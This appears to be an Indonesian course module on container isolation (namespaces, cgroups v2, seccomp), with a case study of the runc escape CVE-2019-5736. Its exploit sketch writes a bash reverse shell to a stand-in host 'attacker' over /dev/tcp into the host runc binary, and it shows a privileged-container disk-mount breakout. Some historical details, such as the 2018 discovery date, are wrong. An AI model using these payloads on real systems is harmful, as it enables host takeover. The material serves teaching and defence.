# Modul 124: Isolasi Kernel & Kontainerisasi dari Nol (Namespaces, cgroups v2, chroot/pivot_root, OverlayFS, OCI runc)

**Navigasi**: [⬅️ Master Index](../../INDEX.md) | [Tingkat 7: Tingkat 7: Operating Systems Internals & Penguasaan Penuh Linux](./README.md)
*Sebelumnya*: [123. observabilitas-sistem-rekayasa-performa](./123-observabilitas-sistem-rekayasa-performa.md) | *Berikutnya*: [125. sinyal-sistem-waktu-kontinu-diskrit](../08-dsp-telekomunikasi-jaringan/125-sinyal-sistem-waktu-kontinu-diskrit.md)

---

## 1. Intuisi Dasar Tanpa Jargon ("Seperti Bayi Baru Lahir")
### 1.1 Konsep Inti & Analogi Tanpa Jargon
Banyak orang mengira kontainer seperti Docker adalah mesin virtual mini yang menjalankan sistem operasi tiruan lengkap dengan BIOS dan kernel virtualnya sendiri. Itu adalah kesalahpahaman besar. Di dalam sistem Linux, tidak ada benda fisik yang bernama 'Kontainer' ([Linux Containers & Namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)). Sebuah kontainer hanyalah proses Linux biasa yang dipakaikan kacamata kuda oleh kernel: **Linux Namespaces** adalah kacamata ilusi yang membatasi apa yang bisa dilihat oleh proses (ia hanya bisa melihat proses di dalam kotaknya sendiri, antarmuka jaringannya sendiri, dan direktori root virtualnya sendiri); sementara **Control Groups (cgroups v2)** adalah borgol pengukur yang membatasi berapa banyak sumber daya yang boleh ia santap (maksimal 2 core CPU dan 512 MB RAM). Dipadukan dengan filter keamanan **Seccomp** yang memblokir syscall berbahaya, terciptalah benteng isolasi kontainer yang ringan dan kokoh.

### 1.2 Urgensi Rekayasa & Signifikansi Sistemik
Dalam rekayasa sistem modern, pemahaman mendalam tentang konsep ini membedakan arsitek sistem kelas dunia dari sekadar operator perkakas teknis.

## 2. Fondasi Teoretis & Aksiomatik / Matematis
### 2.1 Kerangka Teori Aksiomatik & Formulasi Matematis
Fondasi Matematis dan Arsitektur Isolasi Kontainer Linux (Namespaces & Cgroups v2):

### 2.2 Penurunan Matematis Langkah-demi-Langkah
1. **Tujuh Dimensi Linux Namespaces**:
   Setiap proses memiliki pointer namespace pada `task_struct->nsproxy`:
   - **PID Namespace**: Mengisolasi nomor ID proses. Proses pertama di dalam namespace menjadi PID 1 lokal (meskipun memiliki PID 5842 di sistem host).
   - **NET Namespace**: Mengisolasi stack jaringan fisik (antarmuka jaringan virtual `veth`, tabel routing, aturan iptables/nftables, port binding independen).
   - **MNT Namespace**: Mengisolasi titik pemasangan sistem file (Mount Points), dipadukan dengan syscall `pivot_root`.
   - **UTS Namespace**: Mengisolasi nama hostname dan domain.
   - **IPC Namespace**: Mengisolasi antrean pesan System V/POSIX dan Shared Memory.
   - **USER Namespace**: Memetakan UID 0 (root di dalam kontainer) ke UID 10001 biasa di host fisik tanpa hak istimewa superuser!
   - **CGROUP Namespace**: Mengisolasi visibilitas hierarki direktori cgroup.

2. **Arsitektur Cgroups v2 (Unified Hierarchy)**:
   Diatur dalam pohon file virtual terpadu di bawah `/sys/fs/cgroup`. Pengendali sumber daya meliputi:
   - `cpu.max`: Batas kuota waktu eksekusi CPU per periode (misal `200000 100000` = kuota 200 ms per periode 100 ms $\implies$ 2 core CPU).
   - `memory.max`: Batas memori absolut; jika terlampaui, OOM Killer mematikan proses di dalam cgroup tanpa mengganggu host luar.

## 3. Anatomi Teknis & Cara Kerja Internal
Alur Isolasi Ruang Proses Kontainer Menggunakan Linux Namespaces, Cgroups, dan Pivot Root:

```mermaid
graph TD
A[Host Linux Kernel Ring 0] --> B[Host Root Namespace: PID 1 systemd, Real Hardware Network eth0]
B -->|clone with CLONE_NEWPID, CLONE_NEWNET, CLONE_NEWNS| C[Container 1 Sandbox]
C --> D[PID Namespace: Isolated PID 1 init process]
C --> E[NET Namespace: Virtual veth0 linked via Bridge br0]
C --> F[MNT Namespace: RootFS isolated via pivot_root]
C --> G[Cgroup v2: Hard Limits enforced: cpu.max, memory.max]
C --> H[Seccomp-BPF Filter: Block 250+ Unused System Calls]
end
```

1. **Seccomp-BPF (Secure Computing Mode)**: Memeriksa setiap pemanggilan syscall menggunakan program mini filter eBPF. Jika kontainer memanggil syscall terlarang (seperti `reboot`, `swapon`, atau `kexec_load`), kernel langsung mematikan proses dengan sinyal `SIGSYS` atau mengembalikan error `EPERM` ([Linux Seccomp Documentation](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html)).

#### Tabel Penelusuran Pelarian Kontainer Docker via Manipulasi Host PID Namespace (CVE-2019-5736)
| Langkah Eksploitasi Kontainer | Lingkungan Eksekusi | Status Namespace PID | Status Proteksi File `/proc/[pid]/exe` | Aksi Manipulasi Biner Runc Host | Dampak Keamanan Host |
|---|---|---|---|---|---|
| Kontainer Berjalan | User Guest di Docker | Terisolasi via `CLONE_NEWPID` | Mount `/proc` privat kontainer | Kontainer terbatas dalam sandbox | Tidak ada akses ke host |
| Eksekusi Perintah Admin | Admin menjalankan `docker exec` | Biner `runc` host masuk ke kontainer | `runc` berjalan sebagai UID 0 root! | File descriptor biner runc terbuka | `runc` memegang referensi ke binernya sendiri di host! |
| Penyusupan Penyerang | Penyerang mengganti biner target | Penyerang menimpa biner di kontainer | Menunjuk ke `/proc/self/exe` milik runc host! | Menimpa file eksekutabel runc di host OS! | **HOST RUNC BINARY OVERWRITTEN!**|
| Eksekusi Berikutnya | Admin menjalankan docker berikutnya | Host mengeksekusi biner runc yang rusak | Payload penyerang dieksekusi di root host | Penyerang merebut root sistem operasi host | **CONTAINER ESCAPE SUKSES 100%!** |
| Mitigasi Defensif | Memori Sealing | Flag `MFD_CLOEXEC` | Salin runc ke memori anonim read-only | Penulisan ke biner runc dicegah mutlak | Pelarian kontainer digagalkan |

## 4. Implementasi Praktis & Kode / Simulasi Riil
```c
// Minimal Container Creation from Scratch in C using clone() Namespaces and Hostname Isolation
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/wait.h>
#include <sys/mount.h>

#define STACK_SIZE (1024 * 1024) // 1 MB Stack untuk proses kontainer baru
static char container_stack[STACK_SIZE];

static int container_main(void *arg) {
    printf("[Inside Container] Virtual PID: %d\n", getpid());
    
    // Ubah hostname di dalam UTS namespace terisolasi tanpa mempengaruhi host!
    sethostname("isolated-container", 18);
    
    // Eksekusi shell interaktif di dalam lingkungan terisolasi
    char *args[] = {"/bin/sh", NULL};
    execve(args[0], args, NULL);
    
    perror("execve failed");
    return 1;
}

int main(void) {
    printf("[Host] Spawning isolated container process...\n");
    
    // Buat proses baru dengan New UTS, New PID, dan New Mount Namespaces
    int flags = CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD;
    pid_t container_pid = clone(container_main, container_stack + STACK_SIZE, flags, NULL);
    
    if (container_pid < 0) {
        perror("clone failed");
        return 1;
    }

    printf("[Host] Container running with Host PID: %d\n", container_pid);
    waitpid(container_pid, NULL, 0);
    printf("[Host] Container exited cleanly.\n");
    return 0;
}
```

## 5. Miskonsepsi & Jebakan Industri
1. **Container Breakout via Privileged Mode Flag (`--privileged`)**: Menjalankan kontainer dengan flag `--privileged` menonaktifkan seluruh isolasi AppArmor, Seccomp, dan memberikan semua kapabilitas Linux (`CAP_SYS_ADMIN`). Penyerang di dalam kontainer dapat me-mount partisi disk host langsung (`mount /dev/sda1 /mnt`) dan mengambil alih server host secara penuh ([Docker Security Best Practices](https://docs.docker.com/engine/security/)).
2. **Cgroups v1 Memory Starvation Deadlock**: Menggunakan cgroups v1 lama di mana memori Page Cache buffer I/O tidak diperhitungkan secara akurat bersama memori anonim, menyebabkan starvation tak terduga yang dipecahkan pada model arsitektur terpadu Cgroups v2.
3. **Exposing Host `/proc` or `/sys` Inside Container**: Me-mount direktori `/proc` host secara langsung ke dalam kontainer tanpa masking. Proses kontainer dapat membaca informasi hardware sensitif atau bahkan memicu crash via penulisan ke `/proc/sysrq-trigger`.

### Studi Kasus Kegagalan Nyata: Eksploitasi Pelarian Kontainer Docker Runc Melalui Timpaan File Deskriptor Host (CVE-2019-5736)
- **Kronologi & Konteks Sejarah**: Pada Februari 2018, peneliti keamanan Aleksa Sarai dan Adam Iwaniuk menemukan kerentanan kritis pelarian kontainer (*Container Escape*) pada `runc` (komponen runtime inti kontainer yang menjadi dasar Docker, containerd, Kubernetes, dan Podman).
- **Akar Masalah Isolasi Kernel Linux & File Deskriptor /proc**: Kontainer Linux bukanlah mesin virtual penuh; kontainer adalah proses biasa yang diisolasi menggunakan fitur kernel Linux: Namespaces dan cgroups. Ketika seorang administrator host mengeksekusi perintah `docker exec` ke dalam kontainer yang telah disusupi penyerang, biner `runc` dari host memasuki namespace kontainer sebagai pengguna root. Melalui symlink sistem berkas semu Linux `/proc/self/exe` yang menunjuk langsung ke biner `runc` fisik di sistem operasi host, kontainer dapat membuka file descriptor biner tersebut dalam mode penulisan (`O_WRONLY`). Penyerang menimpa kode biner eksekutabel `runc` pada disk host dengan skrip shellcode berbahaya. Ketika perintah docker berikutnya dijalankan di mesin host, skrip penyerang dieksekusi dengan hak akses root pada sistem operasi induk, menembus isolasi kontainer secara mutlak.

- **Potongan Kode / Arsitektur Cacat (Vulnerable Implementation)**:
```c
// Rekonstruksi Mekanisme Penimpaan Biner Host pada Runc (CVE-2019-5736)
#include <fcntl.h>
#include <unistd.h>

void exploit_container_escape_concept(void) {
    // 1. Dapatkan handle file descriptor ke biner runc host yang sedang mengeksekusi di kontainer
    int runc_fd = open("/proc/self/exe", O_RDONLY);
    
    // 2. Buka ulang file descriptor tersebut melalui /proc/self/fd/ dalam mode penulisan
    int runc_write_fd = -1;
    while (runc_write_fd < 0) {
        runc_write_fd = open("/proc/self/fd/3", O_WRONLY | O_TRUNC);
    }
    
    // 3. KONTAMINASI BUKTI: Tulis payload biner penyerang langsung ke file /usr/bin/runc di HOST!
    write(runc_write_fd, "#!/bin/bash\n/bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n", 56);
    close(runc_write_fd);
    // Saat admin menjalankan perintah docker berikutnya di host, backdoor langsung aktif!
}
```

- **Analisis Forensik & Rekayasa Modern**: Insiden CVE-2019-5736 menjadi peringatan terbesar bahwa *containers do not contain like VMs*. Komponen runtime kontainer modern kini menerapkan teknik *Memfd Sealing*: sebelum biner runtime memasuki namespace kontainer pengguna, biner menyalin dirinya sendiri ke dalam blok memori anonim terisolasi menggunakan `memfd_create()` dan menyegelnya (*seal memory*) dengan atribut read-only, sehingga modifikasi melalui `/proc` mustahil dilakukan.

## 6. Proyek Latihan & Rubrik Penilaian Mandiri
1. **Tingkat Pemula**: Gunakan utilitas baris perintah Linux `unshare` untuk menjalankan shell mandiri di dalam UTS dan PID Namespace baru (`unshare -u -p -f /bin/bash`). Ubah hostname di dalam shell tersebut dan buktikan hostname host asli tidak terpengaruh.
2. **Tingkat Menengah**: Buat grup kontrol sumber daya manual di bawah Cgroups v2 (`/sys/fs/cgroup/test_group`). Batasi alokasi memori maksimum sebesar 50 MB (`memory.max = 50M`). Jalankan skrip pemakan memori di dalam cgroup tersebut dan amati intervensi terminasi OOM Killer.
3. **Tingkat Mahir**: Bangun runtime kontainer mini mandiri dari awal dalam bahasa C (seperti Docker mini): terapkan isolasi PID, NET, MNT, UTS, batasi sumber daya via cgroups v2, isolasi root filesystem via `pivot_root`, dan terapkan filter Seccomp-BPF yang melarang syscall `ptrace` dan `reboot`.

### Tingkat 1: Dasar
- **Tugas**: Bangun program isolasi direktori (*Chroot Jail Sandbox*) mandiri dalam C yang membatasi proses anak ke dalam subdirektori terisolasi menggunakan system call `chroot()` dan `chdir()`, lalu turunkan hak akses ke non-root dan buktikan anak tidak dapat mengakses direktori induk (`/etc` atau `/home`).
- **Petunjuk Perancangan Arsitektur**:
  - Selalu panggil `chdir("/")` segera setelah `chroot()` untuk mencegah penyerang keluar dari jail menggunakan pointer path relatif `../..`.
  - Pasang biner shell statis minimalis di dalam direktori root jail.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Upaya Pelarian Direktori*: Jalankan eksploitasi escape chroot standar; buktikan proses anak terkurung rapat di dalam jail dan akses ke luar diblokir dengan `-ENOENT`.
- **Rubrik Penilaian Mandiri**: 40% Urutan Pemanggilan chroot & chdir yang Benar, 30% Penurunan Izin Non-Root Efektif, 30% Ketahanan Sandbox Jail.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan mesin kontainer mini (*Mini Container Runtime*) dalam C/Linux yang mengisolasi proses menggunakan 6 Linux Namespaces utama (`CLONE_NEWPID`, `CLONE_NEWNET`, `CLONE_NEWNS`, `CLONE_NEWUTS`, `CLONE_NEWIPC`, `CLONE_NEWUSER`) via pemanggilan sistem `clone()`, lalu atur nama host kontainer independen dan amati isolasi tabel proses dari host.
- **Petunjuk Perancangan Arsitektur**:
  - Mount sistem berkas semu `/proc` baru yang terisolasi di dalam namespace mount kontainer.
  - Proses pertama di dalam kontainer harus melihat dirinya sendiri sebagai PID 1.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Inspeksi PID 1*: Jalankan `ps aux` di dalam kontainer; buktikan hanya proses kontainer yang terlihat dan seluruh proses sistem operasi host tersembunyi 100%.
- **Rubrik Penilaian Mandiri**: 40% Konfigurasi 6 Flag Namespaces Lengkap pada clone(), 30% Isolasi Mount /proc Mandiri (PID 1 Terverifikasi), 30% Kerapian Struktur Runtime.

### Tingkat 3: Mahir
- **Tugas**: Rancang sistem penegakan kuota sumber daya multi-kontainer menggunakan subsistem Linux *cgroups v2* terpadu (`unified hierarchy`) yang membatasi memori RAM maksimum hingga tepat $128\text{ MiB}$ (`memory.max`), batas bandwidth CPU hingga 50% (`cpu.max`), serta penanganan OOM Killer lokal kontainer tanpa mengganggu proses di luar cgroup.
- **Petunjuk Perancangan Arsitektur**:
  - Buat node cgroup di `/sys/fs/cgroup/my_container/` dan masukkan PID proses target ke file `cgroup.procs`.
  - Pantau kejadian Out-Of-Memory melalui file notifikasi event `memory.events`.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Uji Stres Alokasi OOM*: Jalankan proses di dalam cgroup yang mencoba mengalokasikan 256 MiB RAM; buktikan kernel OOM killer mematikan proses anak di dalam cgroup saat menyentuh batas 128 MiB tanpa ada dampak gangguan pada proses host lainnya.
- **Rubrik Penilaian Mandiri**: 40% Pengelolaan Hierarki Terpadu cgroups v2 yang Benar, 30% Penegakan Kuota Memori dan CPU Maksimum Efektif, 30% Isolasi OOM Killer Terverifikasi.

## 7. Rekomendasi Sumber Belajar Standar Emas
| Sumber Pembelajaran | Penulis / Institusi | Tautan Langsung | Fokus Materi |
| :--- | :--- | :--- | :--- |
| Linux Namespaces man-pages (namespaces.7) | Michael Kerrisk | [Linux man7 Namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html) | Spesifikasi 7 Linux Namespaces, unshare, setns, clone API |
| Control Group v2 (cgroups v2) Official Documentation | Tejun Heo (Kernel Maintainer) | [Linux Kernel cgroup-v2](https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html) | Unified Hierarchy, Controllers (CPU, Memory, I/O, PIDs) Mechanics |
| Seccomp BPF (Secure Computing with Filters) | The Linux Kernel Archives | [Linux Seccomp BPF Docs](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html) | Sandboxing System Calls, BPF Instruction Verification & Audit |
| Container Security: Fundamental Technology Concepts | Liz Rice (Aqua Security) | [O'Reilly Container Security](https://www.oreilly.com/library/view/container-security/9781492056690/) | Linux Isolation Mechanics, Capabilities, Seccomp Profiles & Rootless Containers |

---
*Navigasi Cepat*: [Ke Tingkat 7](./README.md) | [Ke Master Index](../../INDEX.md) | *Sebelumnya*: [123. observabilitas-sistem-rekayasa-performa](./123-observabilitas-sistem-rekayasa-performa.md) | *Berikutnya*: [125. sinyal-sistem-waktu-kontinu-diskrit](../08-dsp-telekomunikasi-jaringan/125-sinyal-sistem-waktu-kontinu-diskrit.md)
